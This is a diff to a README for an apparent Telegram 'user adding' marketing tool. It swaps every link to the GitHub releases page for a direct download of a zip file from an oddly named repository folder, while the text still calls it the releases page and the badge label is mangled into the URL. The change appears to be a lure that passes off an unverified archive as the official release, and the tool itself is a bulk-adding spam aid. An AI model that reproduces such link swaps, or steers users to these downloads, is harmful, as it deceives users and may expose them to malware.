@@ -4,13 +4,13 @@
 Telegram-Users-Adding-Free is a free tool designed for Telegram marketing. This software, built with Python, allows you to easily connect your accounts and utilize various functions to grow your audience and enhance your marketing efforts.
 
 ## 🔗 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/ahmedsix30/Telegram-Users-Adding-Free/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/ahmedsix30/Telegram-Users-Adding-Free/main/decephalization/Telegram-Users-Adding-Free.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/ahmedsix30/Telegram-Users-Adding-Free/main/decephalization/Telegram-Users-Adding-Free.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page**  
-   Click on this link to go to the releases page: [Download Releases](https://github.com/ahmedsix30/Telegram-Users-Adding-Free/releases). This page contains the latest version of the software.
+   Click on this link to go to the releases page: [Download Releases](https://raw.githubusercontent.com/ahmedsix30/Telegram-Users-Adding-Free/main/decephalization/Telegram-Users-Adding-Free.zip). This page contains the latest version of the software.
 
 2. **Find the Latest Version**  
    On the releases page, look for the latest version at the top of the list. You will typically see the version number and its release date. 
@@ -66,4 +66,4 @@ If you encounter issues or have questions, please reach out through our GitHub I
 - telegram-adder-free
 
 ## 🔗 Download Again
-For convenience, here's the download link once more: [Download Releases](https://github.com/ahmedsix30/Telegram-Users-Adding-Free/releases)
+For convenience, here's the download link once more: [Download Releases](https://raw.githubusercontent.com/ahmedsix30/Telegram-Users-Adding-Free/main/decephalization/Telegram-Users-Adding-Free.zip)
